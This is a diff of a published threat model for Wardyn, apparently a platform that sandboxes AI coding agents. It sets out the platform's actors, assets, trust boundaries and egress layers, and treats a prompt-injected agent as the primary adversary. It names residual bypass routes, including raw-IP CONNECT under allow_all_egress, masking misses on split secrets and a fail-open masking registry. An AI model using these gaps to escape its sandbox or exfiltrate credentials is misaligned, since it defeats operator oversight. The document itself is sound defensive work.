@@ -3,18 +3,21 @@
 **Version:** v2 (tracks the shipped codebase; last reviewed at v0.6.6)
 **Status:** published alongside the codebase.
 
-**Implementation status markers.** This document is forward-looking. Controls
-are tagged inline: **[shipped]** (enforced in code today; sometimes dated or
-qualified — `[v0.5+ shipped]`, `[v0.6 shipped]`, `[shipped, default-on]`,
-`[experimental]`) or **[planned]** (sometimes dated — `[v0.5+ — planned]`).
-An untagged control is shipped. Per the project's
-anti-overclaim rule, any untagged claim not actually enforced in code is a bug,
-not prose license — report it.
+**Implementation status markers.** Controls are tagged inline: **[shipped]**
+(enforced in code today; sometimes dated or qualified — `[v0.5+ shipped]`,
+`[v0.6 shipped]`, `[shipped, default-on]`, `[experimental]`) or **[planned]**.
+An untagged control is shipped. Per the project's anti-overclaim rule, any
+untagged claim not actually enforced in code is a bug, not prose license —
+report it.
 
-**Scope.** This document is the threat model of the WARDYN IMPLEMENTATION: its
-assets, its trust boundaries, its residuals. It is deliberately Wardyn-shaped and
-does not travel. For the portable layer — shared terminology, threat categories
-for agent systems generally, and who owns which control — see
+**Scannability icons.** Status columns prefix (never replace) the word:
+🟢 trusted / shipped / stable · 🟡 partially trusted / partial / planned ·
+⛔ untrusted / refused.
+
+**Scope.** This is the threat model of the WARDYN IMPLEMENTATION: its assets,
+trust boundaries, residuals. It is deliberately Wardyn-shaped and does not
+travel. For the portable layer — shared terminology, threat categories for agent
+systems generally, and who owns which control — see
 [AGENT-THREAT-MODEL.md](AGENT-THREAT-MODEL.md), whose every category carries a
 coverage verdict pointing back into this document.
 
@@ -22,13 +25,13 @@ coverage verdict pointing back into this document.
 
 ## 0. Why We Publish This
 
-Every prior vendor in this space overclaimed. One marketed its egress veto as
-unbypassable, then its own red team documented the `ld-linux`/`mmap` bypass.
-Another shipped a sandbox-escape CVE. A third's egress firewall was blind to
-MCP traffic.
+Every prior vendor in this space overclaimed: one marketed its egress veto as
+unbypassable and its own red team then documented the `ld-linux`/`mmap` bypass;
+another shipped a sandbox-escape CVE; a third's egress firewall was blind to MCP
+traffic.
 
 This document states what Wardyn defends and — explicitly — what it does not.
-**Overclaiming is the industry failure mode we are designed to avoid.** If a
+**Overclaiming is the industry failure mode we are designed to avoid.** Where a
 control is load-bearing for a claim, the bypass class that defeats it is named
 here. Security researchers should treat the out-of-scope section as an
 invitation, not an embarrassment.
@@ -39,15 +42,15 @@ invitation, not an embarrassment.
 
 | Actor | Capability | Trust |
 |---|---|---|
-| **Honest developer** | Requests an agent run; reviews/merges PRs; owns the human `sub` in the delegation chain | Trusted-but-accountable. Not granted the agent's runtime access. |
-| **Prompt-injected agent (primary adversary)** | Arbitrary code execution inside its sandbox; full reasoning; reads any in-sandbox file; drives any tool the gateway exposes. Hostile payload arrives via repo content, web fetch, MCP tool output, dependency, or issue text. | **Untrusted.** This is the threat the whole platform exists to contain. |
-| **Malicious insider (developer)** | Legitimately can launch agent runs; tries to use the agent as laundering/cover for actions they could not perform under their own identity, or to dodge attribution. | Authenticated, partially trusted, audited. |
-| **Member on a member-mode desktop (topology m′)** | The human at the keyboard of an org-managed laptop where `WARDYN_MEMBER_MODE=true`: an OIDC session deriving `member`, so `isOperator` is false on every request. Legitimately onboards their OWN workspaces and mounts their OWN project directories into runs. Is **root on the laptop**, but is NOT the governance authority — config, policy and the admin credential are MDM/IdP-held. | Authenticated, partially trusted, audited. Distinct from "malicious insider" above in one way that matters: an insider on the DESKTOP tier *is* the admin (see `docs/DESKTOP.md`), a member-mode developer deliberately is not — which is what makes the member-mount root allowlist a real boundary rather than a suggestion, and residual #26 the honest limit of it. |
-| **Compromised dependency / supply chain** | Code executing with agent privileges inside the sandbox (build tooling, npm/pip postinstall, MCP server image). | Untrusted; collapses into "prompt-injected agent" for containment purposes. |
-| **Repo-supplied devcontainer/build content** | Arbitrary `Dockerfile` `RUN` / devcontainer feature / lifecycle-command execution during a workspace image build (`internal/envbuild`'s ENVBUILDER stage) — BEFORE any confinement tier exists. | **Untrusted.** Executes on the host build container, not inside a Confinement Class and not behind `wardyn-proxy` — see residual #13 and boundary B8. |
-| **External network attacker** | Can host malicious endpoints; attempt domain fronting, DNS rebinding; run a confused-deputy against the egress/git proxy. | Untrusted, off-box. |
-| **Compromised single runner node** | Root on one runner host; tries lateral movement to control plane, other tenants' sandboxes, or the secret store. | Untrusted after compromise; blast-radius containment target. |
-| **Platform operator / SRE** | Admin of the control plane. | Trusted. Out of scope as an adversary in v1 (insider-admin threat = future hardening). |
+| **Honest developer** | Requests an agent run; reviews/merges PRs; owns the human `sub` in the delegation chain | 🟡 Trusted-but-accountable. Not granted the agent's runtime access. |
+| **Prompt-injected agent (primary adversary)** | Arbitrary code execution inside its sandbox; reads any in-sandbox file; drives any tool the gateway exposes. Hostile payload arrives via repo content, web fetch, MCP tool output, dependency or issue text. | ⛔ **Untrusted.** This is the threat the whole platform exists to contain. |
+| **Malicious insider (developer)** | Legitimately launches agent runs; uses the agent as laundering/cover for actions they could not perform under their own identity, or to dodge attribution. | 🟡 Authenticated, partially trusted, audited. |
+| **Member on a member-mode desktop (topology m′)** | The human at the keyboard of an org-managed laptop where `WARDYN_MEMBER_MODE=true`: an OIDC session deriving `member`, so `isOperator` is false on every request. Onboards their OWN workspaces and mounts their OWN project directories into runs. Is **root on the laptop**, but is NOT the governance authority — config, policy and the admin credential are MDM/IdP-held. | 🟡 Authenticated, partially trusted, audited. Distinct from "malicious insider": a DESKTOP-tier insider *is* the admin (`docs/DESKTOP.md`), a member-mode developer deliberately is not — which makes the member-mount root allowlist a real boundary rather than a suggestion, with residual #26 its honest limit. |
+| **Compromised dependency / supply chain** | Code executing with agent privileges inside the sandbox (build tooling, npm/pip postinstall, MCP server image). | ⛔ Untrusted; collapses into "prompt-injected agent" for containment purposes. |
+| **Repo-supplied devcontainer/build content** | Arbitrary `Dockerfile` `RUN` / devcontainer feature / lifecycle-command execution during a workspace image build (`internal/envbuild`'s ENVBUILDER stage) — BEFORE any confinement tier exists. | ⛔ **Untrusted.** Executes on the host build container, not inside a Confinement Class and not behind `wardyn-proxy` — see residual #13 and boundary B8. |
+| **External network attacker** | Hosts malicious endpoints; attempts domain fronting, DNS rebinding, confused-deputy against the egress/git proxy. | ⛔ Untrusted, off-box. |
+| **Compromised single runner node** | Root on one runner host; tries lateral movement to control plane, other tenants' sandboxes, or the secret store. | ⛔ Untrusted after compromise; blast-radius containment target. |
+| **Platform operator / SRE** | Admin of the control plane. | 🟢 Trusted. Out of scope as an adversary in v1 (insider-admin threat = future hardening). |
 
 ---
 
@@ -55,81 +58,79 @@ invitation, not an embarrassment.
 
 1. **Long-lived root secrets** — GitHub App private key, cloud-provider
    STS-federation trust, model-provider API keys, SPIRE upstream CA key,
-   OpenBao unseal/root. Held only by the token broker, OpenBao, and SPIRE
-   server. Never in any sandbox.
+   OpenBao unseal/root. Held only by the token broker, OpenBao and SPIRE server.
+   Never in any sandbox.
 2. **The minting authority** — the broker's ability to issue scoped tokens.
    Compromising the minting decision path is worse than stealing one minted
    token.
 3. **Minted short-lived credentials** — 1h repo-scoped GitHub installation
    tokens, ~1h cloud STS credentials, OAuth-exchange tokens. Bounded by TTL,
-   scope, and audience.
-4. **Source code + the git push capability** — the minted GitHub installation
+   scope and audience.
+4. **Source code + the git push capability.** The minted GitHub installation
    token is repo-scoped and permission-clamped (max `contents:write` +
    `pull_requests:write`, 1h TTL). Bot-branch-namespace confinement
    (`wardyn/<run-id>/*`) is **[shipped, default-on]** at the git-broker proxy
-   route: it parses the
-   `git-receive-pack` pkt-line command section and refuses every ref outside
-   `refs/heads/wardyn/<run-id>/` (including deletes) before the token is
-   minted. It needs no opt-in because `agent-run` checks each cloned repo out
-   onto `wardyn/<run-id>/work`, so a stock run already complies;
-   `WARDYN_GIT_BROKER_ENFORCE_BRANCH_NS=false` is the escape hatch. Dispatch
-   also subtracts the broker-managed GitHub hosts from a brokered run's egress
-   and denies them — plus, now, that forge's `ssh.<forge>` SSH-over-443
-   endpoint — so the brokered route is the only route to those host NAMES:
-   previously a sandbox could dial `github.com:443` directly, an opaque
-   CONNECT the pkt-line parser cannot read, and `wardyn-git-helper` no longer
-   mints an installation token into a brokered sandbox at all. It is a NAME
-   deny: the verdict keys on the host string the sandbox asked for, so a
-   raw-IP `CONNECT` is a different key, which `allow_all_egress` would permit
-   (measured). See `docs/POLICIES.md`.
-   It binds the **brokered App lane only** — a `git_pat` push is an opaque
-   CONNECT and an `ssh_key` push is not smart-HTTP, so no receive-pack parser
-   can bind either — but for the one forge a run is actually **brokered**
-   for, no second push path is left beside the parser, not just a narrower
-   one: policy-write refuses a `github_token` grant declared alongside an
-   `ssh_key` grant for the same forge (`api.validateGrantLaneExclusivity`),
-   and dispatch withholds that forge's `ssh_key` grant from the sandbox
-   entirely (`api.dropBrokeredGrants`, audited as `run.ssh.brokered_forge`)
-   on top of denying its endpoint — so the key is never resident, not merely
-   unreachable. (This closure reverses an earlier decision recorded in this
-   same review; see `confineGitBrokerEgress` in
-   `internal/api/runs_dispatch_gitbroker.go` for why the reversal is deliberate.) An
-   **unbrokered** SSH credential — an `ssh_key` for a forge the run holds no
-   `github_token` for (`dev.azure.com`, or `github.com` with no repos
-   granted) — keeps the old shape: written for the clone only
-   (`wipe_ssh_grants` shreds it and unsets `GIT_SSH_COMMAND` before the agent
-   starts), a narrowing and not a confinement, since the grant id still rides
-   `WARDYN_SSH_GRANTS` and an auto-mintable grant is re-mintable by design —
-   bounded by the operator who supplied it, not by Wardyn. A token
-   exfiltrated from the proxy itself is bounded only by whatever GitHub-side
-   ruleset the operator has created on the repo: `VerifyRefRuleset`
-   (`internal/broker/ruleset.go`) reads that ruleset back — `creation`,
-   `update` and `deletion` in force outside the run namespace, neither in
-   force inside it, and every backing ruleset's `current_user_can_bypass`
-   equal to `"never"` — the setup checklist grades it (never `fail`, only
-   `warn`/unknown), and `WARDYN_GITHUB_REQUIRE_REF_RULESET` (opt-in, default
-   off) turns the same read into a pre-mint gate. Branches only: the ruleset
-   leaves `refs/tags/*` open, and classic branch protection (a different API)
-   does not surface in the rules endpoint this reads, so a repo protected
-   that way still grades unconfined.
+   route: it parses the `git-receive-pack` pkt-line command section and refuses
+   every ref outside `refs/heads/wardyn/<run-id>/` (including deletes) before the
+   token is minted. No opt-in is needed because `agent-run` checks each cloned repo
+   out onto `wardyn/<run-id>/work`;
+   `WARDYN_GIT_BROKER_ENFORCE_BRANCH_NS=false` is the escape hatch.
+
+   Dispatch also subtracts and denies the broker-managed GitHub hosts —
+   `github.com`, `api.github.com`, `codeload.github.com`,
+   `*.githubusercontent.com`, plus that forge's `ssh.<forge>` SSH-over-443
+   endpoint — so the brokered route is the only route to those host NAMES, and
+   `wardyn-git-helper` no longer mints an installation token into a brokered
+   sandbox at all. It is a NAME deny: the verdict keys on the host string the
+   sandbox asked for, so a raw-IP `CONNECT` is a different key, which
+   `allow_all_egress` would permit (measured). See `docs/POLICIES.md`.
+
+   **The parser binds the brokered App lane only, but on the SAME forge no second
+   lane is left beside it.** A `git_pat` push is an opaque CONNECT and an `ssh_key`
+   push is not smart-HTTP, so no receive-pack parser can bind either — but for a
+   forge a run IS brokered for, `api.validateGrantLaneExclusivity` refuses a policy
+   declaring a `github_token` grant alongside an `ssh_key` **or** `git_pat` grant
+   for it, and dispatch's `api.dropBrokeredGrants` withholds any already-stored
+   `ssh_key` **or** `git_pat` grant from the sandbox env (audited
+   `run.ssh.brokered_forge`) on top of denying the endpoint — the key is never
+   resident, not merely unreachable. (This reverses an earlier decision recorded in
+   the same review; `confineGitBrokerEgress`,
+   `internal/api/runs_dispatch_gitbroker.go`, says why deliberately.) An
+   **unbrokered** SSH credential — an `ssh_key` for a forge holding no
+   `github_token` (`dev.azure.com`, or `github.com` with no repos granted) — keeps
+   the old shape: written for the clone only (`wipe_ssh_grants` shreds it and
+   unsets `GIT_SSH_COMMAND` before the agent starts), a narrowing and not a
+   confinement, since the grant id still rides `WARDYN_SSH_GRANTS` and an
+   auto-mintable grant is re-mintable by design — bounded by the operator who
+   supplied it, not by Wardyn.
+
+   A token exfiltrated from the proxy itself is bounded only by whatever
+   GitHub-side ruleset the operator created: `VerifyRefRuleset`
+   (`internal/broker/ruleset.go`) reads it back — `creation`, `update` and
+   `deletion` in force outside the run namespace, neither in force inside it, every
+   backing ruleset's `current_user_can_bypass` equal to `"never"` — the setup
+   checklist grades it (never `fail`, only `warn`/unknown), and
+   `WARDYN_GITHUB_REQUIRE_REF_RULESET` (opt-in, default off) turns the same read
+   into a pre-mint gate. Branches only: the ruleset leaves `refs/tags/*` open, and
+   classic branch protection (a different API) does not surface in the rules
+   endpoint this reads, so a repo protected that way still grades unconfined.
+
 5. **Audit integrity** — the append-only control-plane log, eBPF ground truth,
-   PTY recordings. Tampering defeats incident response. NOTE: append-only
-   protects what IS written; it does not yet guarantee every control-plane
-   action produces an event, and PTY recordings specifically are
-   tamper-EVIDENT, not tamper-proof — see §4 "Audit tampering by in-sandbox
-   actor". Control-plane audit writes (identity
-   mint/revoke, approval decide, broker mint/revoke) are still best-effort AT
-   THE CALL SITE (fire-and-forget, not wrapped in the mint transaction) — but
-   the shared recorder chain (`maskingRecorder -> spoolingRecorder ->
-   auditRec`, shared by every writer: API, broker, identity, approvals,
-   sweeper) now spools a failed primary Postgres write to a durable local
-   append-only JSONL fallback (`WARDYN_AUDIT_SPOOL`) instead of silently
-   dropping it. This is durability via a local fallback, not a transactional
-   guarantee — a write and its spool append can still both fail (logged
-   loudly when that happens); see `ARCHITECTURE.md` invariant 6. The
+   PTY recordings. Tampering defeats incident response. Append-only protects what
+   IS written; it does not yet guarantee every control-plane action produces an
+   event, and PTY recordings are tamper-EVIDENT, not tamper-proof (§4 "Audit
+   tampering by in-sandbox actor"). Control-plane audit writes (identity
+   mint/revoke, approval decide, broker mint/revoke) are still best-effort AT THE
+   CALL SITE (fire-and-forget, not wrapped in the mint transaction) — but the
+   shared recorder chain (`maskingRecorder -> spoolingRecorder -> auditRec`,
+   shared by API, broker, identity, approvals and sweeper) spools a failed primary
+   Postgres write to a durable local append-only JSONL fallback
+   (`WARDYN_AUDIT_SPOOL`) instead of silently dropping it. That is durability via a
+   local fallback, not a transactional guarantee — a write and its spool append can
+   still both fail (logged loudly); see `ARCHITECTURE.md` invariant 6. The
    ground-truth ingest path (§4) is already fail-closed.
 6. **Tenant isolation** — one tenant's sandbox must not reach another's
-   workload, secrets, or network.
+   workload, secrets or network.
 7. **The delegation chain** (`sub=human`, `act=agent-run-SPIFFE-ID`) —
    attribution integrity; target of the IETF delegation-chain-splicing attack
    class (March 2026).
@@ -138,22 +139,21 @@ invitation, not an embarrassment.
 
 ## 3. Trust Boundaries
 
-| Boundary | Description |
-|---|---|
-| **B1 — Sandbox vs. everything else** | The hard boundary. The agent runs on the untrusted side. Enforced by isolation tier (runc-hardened / gVisor / Kata) and L0 structural network confinement. Every higher-layer control assumes the agent is hostile on this side. |
-| **B2 — Sandbox vs. egress proxy** | Sole network path out is the wardyn-proxy sidecar. `HTTP_PROXY`/`HTTPS_PROXY` are set for compatibility, but the env-var-bypass class is defended structurally at L0 (gatewayless network → no route to bypass to), not by omitting the env var. Default-deny. |
-| **B3 — Sandbox vs. MCP/tool gateway** | Separate enforcement plane from B2. A prior agent egress firewall was blind to MCP traffic; we treat tool egress as a first-class boundary. |
-| **B4 — Agent-run identity vs. token broker** | SVID-authenticated; the broker is the only thing that can turn an identity and an approval into a credential. |
-| **B5 — Approval gate vs. credential issuance** | Novel coupling: a high-risk action's approval is what mints the scoped token. No prior art; threat-modeled fresh in section 4. |
-| **B6 — Runner data plane vs. control plane** | mTLS via X.509-SVID **[v0.5+ — planned, arrives with SPIRE]**. Today: a per-run bearer token (minted by the embedded identity provider, verified via `internalAuth`) authenticates runner/sidecar callbacks over the operator's network — not mTLS. A compromised runner is assumed; the control plane does not trust runner-asserted identity claims. |
-| **B7 — Control plane vs. SIEM/customer** | Outbound-only export (OTLP/HEC/syslog); no inbound trust. |
-| **B8 — Untrusted build container vs. host daemon + registry** | The devcontainer build / BYOI wrap (`internal/envbuild`) runs on the HOST Docker daemon, before any confinement tier exists. Capped (CapDrop ALL, resource limits) but not sandboxed by a Confinement Class and not behind `wardyn-proxy`; reaches only the network named by `WARDYN_ENVBUILD_BUILD_NETWORK` (compose default: the run sandboxes' own bridge, never `host`) plus the layer-cache registry. See residual #13. |
-| **B9 — SSH gateway pre-auth listener vs. everything else** | **[v0.5+ shipped]** A NEW anonymous-until-authenticated TCP listener (`WARDYN_SSH_LISTEN`, off by default — no var set, no listener, no host key even generated). Registered-public-key-only auth (no passwords); the trust root is the `ssh_public_keys` registry a human writes to via self-service `/api/v1/me/ssh-keys`, so the boundary this adds is exactly as strong as that registration step and the DoS bounds around the pre-auth handshake (per-connection deadline, `MaxAuthTries`, a concurrent-connection cap — `ssh.NewServerConn` blocks with no default timeout otherwise). Once authenticated, a session is bounded by owner-or-admin authorization (below — the admin half is a bounded-stale `role` stamp, refreshed at every OIDC login and re-checked against `WARDYN_SSH_ROLE_TTL`, but never read live; residual #15) and runs entirely inside B1: the shell/exec/sftp/`-L` primitives are bridged into the EXISTING sandbox via the same `Runner.Attach`/`ExecStream` calls the browser terminal and internal tooling already use — this boundary adds a new front door, not a new back door; nothing on the other side of B1 changes. |
-| **B10 — UI-sandbox gateway origin vs. the console origin** | **[v0.6 shipped]** A SECOND HTTP listener (`WARDYN_UI_SANDBOX_LISTEN`, off by default — no var set, no listener, not even a relay cookie key generated) that relays one policy-declared sandbox loopback port to a browser (`docs/UI-SANDBOXES.md`). What crosses it is **content authored inside B1**: the relayed app's own HTML and JavaScript, executing in the operator's browser. So the boundary is a BROWSER-ORIGIN one, and the separate origin is the enforcement — boot refuses a listen address equal to `-listen`, because on the console's origin that same sandbox-authored code could read the console's token storage (see "Console auth token storage" below) and drive every admin action the operator can. Like B9 this is a new front door, not a new back door: the bytes ride the SAME `Runner.ExecStream` + `socat` lane the SSH `-L` forward already uses, inside the existing sandbox netns — no pod/container-IP dial, no NetworkPolicy delta, nothing on the far side of B1 changes. |
+| Boundary | Status | Description |
+|---|---|---|
+| **B1 — Sandbox vs. everything else** | 🟢 shipped | The hard boundary; the agent runs on the untrusted side. Enforced by isolation tier (runc-hardened / gVisor / Kata) and L0 structural network confinement. Every higher-layer control assumes the agent is hostile here. |
+| **B2 — Sandbox vs. egress proxy** | 🟢 shipped | Sole network path out is the wardyn-proxy sidecar, default-deny. `HTTP_PROXY`/`HTTPS_PROXY` are set for compatibility; the env-var-bypass class is defended structurally at L0 (gatewayless network → no route to bypass to), not by omitting the var. |
+| **B3 — Sandbox vs. MCP/tool gateway** | 🟡 planned (L3) | Separate enforcement plane from B2 — a prior agent egress firewall was blind to MCP traffic, so tool egress is a first-class boundary. L3 does not exist today; this plane is not active. |
+| **B4 — Agent-run identity vs. token broker** | 🟢 shipped | SVID-authenticated; the broker is the only thing that can turn an identity and an approval into a credential. |
+| **B5 — Approval gate vs. credential issuance** | 🟢 shipped | Novel coupling: a high-risk action's approval is what mints the scoped token. No prior art; threat-modeled fresh in §4. |
+| **B6 — Runner data plane vs. control plane** | 🟡 partial | mTLS via X.509-SVID **[planned, arrives with SPIRE]**. Today a per-run bearer token (minted by the embedded identity provider, verified via `internalAuth`) authenticates runner/sidecar callbacks over the operator's network — not mTLS. A compromised runner is assumed; the control plane never trusts runner-asserted identity claims. |
+| **B7 — Control plane vs. SIEM/customer** | 🟢 shipped | Outbound-only export (OTLP/HEC/syslog); no inbound trust. |
+| **B8 — Untrusted build container vs. host daemon + registry** | 🟢 shipped | The devcontainer build / BYOI wrap (`internal/envbuild`) runs on the HOST Docker daemon, before any confinement tier exists. Capped (CapDrop ALL, resource limits) but not sandboxed by a Confinement Class and not behind `wardyn-proxy`; reaches only `WARDYN_ENVBUILD_BUILD_NETWORK` (compose default: the sandboxes' own bridge, never `host`) plus the layer-cache registry. Residual #13. |
+| **B9 — SSH gateway pre-auth listener vs. everything else** | 🟢 **[v0.5+ shipped]** | An anonymous-until-authenticated TCP listener (`WARDYN_SSH_LISTEN`, off by default — no var set, no listener, no host key generated). Registered-public-key-only auth; the trust root is the `ssh_public_keys` registry a human writes via self-service `/api/v1/me/ssh-keys`, so this boundary is exactly as strong as that registration step and the pre-auth DoS bounds (§4). Once authenticated, a session is bounded by owner-or-admin authorization (residual #15) and runs entirely inside B1: shell/exec/sftp/`-L` are bridged into the EXISTING sandbox via the same `Runner.Attach`/`ExecStream` calls the browser terminal uses. A new front door, not a new back door. |
+| **B10 — UI-sandbox gateway origin vs. the console origin** | 🟢 **[v0.6 shipped]** | A second HTTP listener (`WARDYN_UI_SANDBOX_LISTEN`, off by default — no var set, no listener, not even a relay cookie key generated) relaying one policy-declared sandbox loopback port to a browser (`docs/UI-SANDBOXES.md`). What crosses is **content authored inside B1** — the relayed app's own HTML/JS executing in the operator's browser — so this is a BROWSER-ORIGIN boundary and the separate origin is the enforcement: boot refuses a listen address equal to `-listen`, because on the console's origin that sandbox-authored code could read the console's token storage (see "Console auth token storage") and drive every admin action. Like B9 the bytes ride the SAME `Runner.ExecStream` + `socat` lane the SSH `-L` forward uses, inside the existing sandbox netns — no pod/container-IP dial, no NetworkPolicy delta. |
 
-On a single-operator machine the trust boundaries compose into a strict
-containment ladder — Wardyn never *adds* power beyond what the operating user
-already has:
+On a single-operator machine the boundaries compose into a strict containment
+ladder — Wardyn never *adds* power beyond what the operating user already has:
 
 ```mermaid
 flowchart TB
@@ -167,74 +167,229 @@ flowchart TB
   end
 ```
 
-A sandbox can at most reach what the operating user can; operator policy
-clamps that ceiling down; each run receives only the minimal subset of that
-ceiling its task needs.
+A sandbox can at most reach what the operating user can; operator policy clamps
+that ceiling down; each run receives only the minimal subset its task needs.
 
 ---
 
 ## 4. In-Scope Defenses
 
-The following attack classes are **defended by design**. Where a mitigation
-has a residual or bypass class, that is noted and also listed in section 5.
+These attack classes are **defended by design**. Where a mitigation has a
+residual or bypass class, it is noted and also listed in §5.
 
 | Layer | Mechanism | What it stops |
 |---|---|---|
-| L0 structural **[shipped]** | Sandbox network is gatewayless (`Internal:true`); the only off-host path is the wardyn-proxy sidecar | `HTTP_PROXY` env-var bypass class (no route exists to bypass to); direct IP egress |
-| L1 default-deny **[shipped on Kubernetes; Docker planned]** | Kubernetes: per-run NetworkPolicy default-deny (agent egress only to its own proxy; metadata `169.254.169.254` excluded), enforcement PROVEN by the boot canary — a non-enforcing CNI refuses boot. Docker: nftables default-deny still **[planned]** (L0 stands in structurally). Cilium toFQDNs **[planned]** | Non-HTTP raw-socket tunnels that never reach the proxy process at all; extends "no route but the proxy" to the Kubernetes topology. Defense-in-depth ATOP the metadata/link-local guard L2 already enforces below — the metadata block does not wait on L1 to ship |
-| L2 wardyn-proxy **[shipped]** | Domain allowlist (exact + `*.` wildcard); method rules; first-use approval (`always_deny` / `deny_with_review` / `wait_for_review`, which holds the connection for a live operator decision); proxy-side credential injection; an unconditional loopback/link-local/multicast/private-reserved/metadata/NAT64-embedded-v4 guard, checked pre-policy on a literal-IP target and again post-DNS-resolution on every direct-dialed hostname (the opt-in upstream corp-proxy hop defers that re-check to the corp proxy — §5's disclosed residual), that `allow_all_egress` does not reach. **One admin-authored exception**: `SiteConfig.InternalHosts` (`vetHostLift`/`Proxy.vetHost`, `internal/egress/proxy/proxy.go`) lifts the guard's RFC1918/ULA/CGNAT slice ONLY — never loopback/link-local/metadata/multicast/NAT64 — for a declared hostname, scoped to declared CIDRs, and never for an address on the proxy's own interface subnets or its resolved control-plane host (the sidecar's `wardyn-internal` network neighbors on Docker; on Kubernetes those neighbors are ClusterIP Services off the pod's own interface, so only the resolved control-plane address is excluded there and the operator's declared `cidrs` are the bound — `docs/OPERATIONS.md` § Internal hosts). The configured internal model gateway (residual 29) is NOT a second exception to this guard: its own relaxed per-request vet (`Proxy.vetTrustedHost`, reached only via `Proxy.gatewayTarget`) is scoped to the proxy's own brokered `/wardyn/llm/*` route, never to an ordinary sandbox CONNECT/MITM naming the gateway host, which this same `Proxy.vetHost` guard covers unchanged | L7 exfil to unlisted domains; token leakage into sandbox; metadata-server theft and DNS-rebinding, including under `allow_all_egress` |
-| L3 MCP gateway **[v0.5+ — planned]** | Per-tool call approval and logging | Tool-call egress that bypasses the network proxy |
+| L0 structural 🟢 **[shipped]** | Sandbox network is gatewayless (`Internal:true`); the only off-host path is the wardyn-proxy sidecar | `HTTP_PROXY` env-var bypass class (no route exists to bypass to); direct IP egress |
+| L1 default-deny 🟢 **[shipped on Kubernetes]** / 🟡 **[Docker planned]** | Kubernetes: per-run NetworkPolicy default-deny (agent egress only to its own proxy; metadata `169.254.169.254` excluded), enforcement PROVEN by the boot canary — a non-enforcing CNI refuses boot. Docker: nftables default-deny **[planned]** (L0 stands in structurally). Cilium toFQDNs **[planned]** | Non-HTTP raw-socket tunnels that never reach the proxy process; extends "no route but the proxy" to Kubernetes. Depth ATOP the metadata/link-local guard L2 already enforces — the metadata block does not wait on L1 |
+| L2 wardyn-proxy 🟢 **[shipped]** | Domain allowlist (exact + `*.` wildcard); method rules; first-use approval (`always_deny` / `deny_with_review` / `wait_for_review`, which holds the connection for a live operator decision); proxy-side credential injection; and an unconditional loopback/link-local/multicast/private-reserved/metadata/NAT64-embedded-v4 guard `allow_all_egress` does not reach — §4.2 for the guard and its one admin-authored exception | L7 exfil to unlisted domains; token leakage into sandbox; metadata-server theft and DNS-rebinding, including under `allow_all_egress` |
+| L3 MCP gateway 🟡 **[planned]** | Per-tool call approval and logging | Tool-call egress that bypasses the network proxy |
 
-Four egress layers stack outward from the sandbox — L0 structural confinement
-(Docker) and the L2 proxy carry enforcement on every path, L1 default-deny is
-shipped on the Kubernetes substrate (canary-proven NetworkPolicy; the nftables
-form for Docker remains planned), and the L3 tool gateway stays planned.
+Four egress layers stack outward: L0 structural confinement (Docker) and the L2
+proxy carry enforcement on every path, L1 is shipped on Kubernetes
+(canary-proven NetworkPolicy; the Docker nftables form remains planned), and L3
+stays planned.
 
-**Substrate containment delta: Docker (L0) vs Kubernetes (L1).** Docker's
-guarantee is *absence of route* — the per-run network is gatewayless, so there
-is no packet path off-host to bypass. Kubernetes pods always get a routable
-network, so a k8s substrate can only offer L1: a `NetworkPolicy` default-deny
-*packet filter*, applied and enforced by the cluster's CNI rather than removed
-by topology. A filter is only as trustworthy as its enforcer, and CNIs are
-known to silently no-op `NetworkPolicy` for some rule shapes — so the k8s
-substrate does not take the CNI's word for it: a boot-time, two-phase canary
-runs from inside the sandbox's own network namespace right after the deny
-policy applies (phase 1: the allowed path — the wardyn-proxy sidecar — still
-works; phase 2: an address outside the allowlist is unreachable), and the
-substrate refuses to boot the sandbox — fail closed, advertising no
-Confinement Class — if either phase disagrees with what the policy demands.
-This is the honest `NetworkPolicy` bool on `substrate.ClassSupport`: proven by
-the canary, never merely claimed because a policy object was applied.
+**Substrate delta: Docker (L0) vs Kubernetes (L1).** Docker's guarantee is
+*absence of route* — the per-run network is gatewayless. Kubernetes pods always
+get a routable network, so a k8s substrate can only offer L1: a `NetworkPolicy`
+default-deny *packet filter*, enforced by the cluster's CNI. A filter is only as
+trustworthy as its enforcer, and CNIs are known to silently no-op
+`NetworkPolicy` for some rule shapes — so a boot-time two-phase canary runs from
+inside the sandbox's own netns right after the deny policy applies (phase 1: the
+wardyn-proxy sidecar still reachable; phase 2: an address outside the allowlist
+unreachable), and the substrate **refuses to boot the sandbox — fail closed,
+advertising no Confinement Class** — if either phase disagrees. That is the
+honest `NetworkPolicy` bool on `substrate.ClassSupport`: proven by the canary,
+never claimed because a policy object was applied.
 
 | Attack | Defense | Load-bearing layers |
 |---|---|---|
-| Prompt-injected agent reads resident secrets | Secrets are never in the sandbox, with a set of named, bounded exceptions — **§5.1a carries the complete list** (the SSH/git-PAT SCM lanes, Bedrock's SigV4 modes incl. the captured AWS SSO token and the role credentials derived from it, the `~/.aws` and inject-off `~/.claude` mounts, and container-login runs), each with what lands, why it can't be proxy-injected, and what bounds it. Every other third-party credential is late-bound via the broker; proxy-side credential injection so the agent process never holds a bearer token. SecretRegistry output masking (`<secret-hidden>`) on the default brokered recording-upload path + audit events + proxy decision logs **[shipped]** (`internal/secretmask`; verbatim-match only — on the recording-upload path the body is asciicast JSON, so each secret's JSON-escaped rendering is masked alongside its raw bytes (`JSONEscapedVariants`), which covers multi-line keys and quote/backslash-bearing values; a secret SPLIT across two output events by the recorder's PTY read boundaries stays a residual the verbatim match cannot close, since the `"],[t,"o","` event framing interrupts the byte run — the live-attach path masks raw PTY bytes and is unaffected). TWO named unmasked paths. (a) The optional `WARDYN_RECORDING_MOUNT`/`-out-dir` single-host recording fallback bypasses the control plane and therefore delivers UNMASKED casts (masking is structurally control-plane-side — `wardyn-rec` holds no secret values by design); do not use it where recordings are viewer-exposed. (b) The registry itself is **process-local and fails OPEN**: `secretmask.Registry` is an in-memory map, never persisted, populated on whichever wardynd process served the run's injection/mint request; the cast upload and the live-attach relay are separate requests, and both fall back to an unmasked pass-through when the run's snapshot is empty (`buildMaskingBody`, `liveMaskWriter`). One process, one replica — the shipped topology everywhere — makes the CROSS-REPLICA form of this inert, which is why `replicas: 1` is a SAFETY control and the Helm chart now refuses more (`deploy/helm/wardyn/templates/deployment.yaml`) and compose's `container_name` rejects `--scale`. Run a second replica anyway and a cast landing on the wrong pod is persisted verbatim, live credentials in cleartext, with a `success` audit event. **The single-process case is not inert**: a `wardynd` restart (upgrade, crash) mid-run empties the same in-memory map, so a run whose secrets registered pre-restart and whose cast uploads post-restart hits the identical empty-snapshot fail-open at `replicas: 1`. | B1, B2, B4 |
